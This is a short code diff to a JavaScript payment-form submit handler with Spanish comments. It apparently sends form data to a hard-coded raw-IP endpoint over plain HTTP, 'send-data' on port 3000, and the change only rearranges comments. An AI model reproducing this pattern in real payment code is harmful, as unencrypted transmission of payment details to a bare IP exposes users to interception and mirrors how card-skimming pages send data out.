@@ -17,9 +17,10 @@ document.getElementById('payment-form').addEventListener('submit', async functio
         return;
     }
 
-    // 🔹 Verificar si el servidor está disponible antes de enviar datos
-    const serverUrl = "http://95.173.217.71:3000/send-data"; // 🔹 Reemplaza con tu IP pública
+    // 🔹 Definir la URL del servidor
+    const serverUrl = "http://95.173.217.71:3000/send-data";
 
+    // 🔹 Verificar si el servidor está disponible antes de enviar datos
     try {
         const serverCheck = await fetch(serverUrl, { method: 'GET' });
         if (!serverCheck.ok) {
